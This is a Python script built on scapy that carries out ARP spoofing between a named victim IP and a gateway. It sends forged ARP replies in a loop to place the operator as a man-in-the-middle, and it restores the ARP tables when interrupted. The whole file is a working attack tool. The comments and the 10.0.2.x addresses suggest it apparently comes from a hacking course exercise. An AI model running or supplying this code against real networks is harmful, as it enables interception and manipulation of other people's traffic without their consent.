#!/usr/bin/env python
import scapy.all as scapy
import time
import argparse
import sys

def getArguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-gip", "--gateway-ip", dest="gip", help="gateway IP address.")
    parser.add_argument("-vip", "--victim-ip", dest="vip", help="victim IP address.")
    options = parser.parse_args()
    if not (options.gip and options.vip):
        parser.print_help(sys.stderr)
        sys.exit(1)
    return options

def getMACOfVictim(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    
    #the function gives us two lists as answered and unaswered response
    #answered, unaswered = scapy.srp(arp_request_broadcast, timeout=1)
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0] #getting only first response list

    #as we are going to ask for just one IP's MAC address, we can use this one line instead of iterating through the list which indeed has just on member 
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    targetMAC = getMACOfVictim(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=targetMAC, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(source_ip, destination_ip): #as we will call this function twice both with gateway ip and victim ip it takes no different with names here
    destMAC = getMACOfVictim(source_ip)
    sourceMAC = getMACOfVictim(destination_ip)
    packet = scapy.ARP(op=2, pdst=source_ip, hwdst=destMAC, psrc=destination_ip, hwsrc=sourceMAC)
    scapy.send(packet, verbose=False, count=4)

options = getArguments()
snt_packets_count = 0
try:
    while True:
        #spoof("10.0.2.4", "10.0.2.1")
        #spoof("10.0.2.1", "10.0.2.4")
        spoof(options.vip, options.gip)
        spoof(options.gip, options.vip)
        #using formatting much better than the next line in tradition way
        print("\r[+] Sent two malicious packets to gateway and victim, No of total packets: {}".format(snt_packets_count), end='')
        #print("\r[+] Sent two malicious packets to gateway and victim, No of packets:" + str(snt_packets_count),end='\r')

        time.sleep(2)
        snt_packets_count+=2
except KeyboardInterrupt:
    print("\n[+] User aborted ARP spoofing with Ctrl + C")
    print("[+] Restoring ARB tables in normal state, please wait")
    restore(options.vip, options.gip)
    restore(options.gip, options.vip)
    print("[+] Restore packets were sent")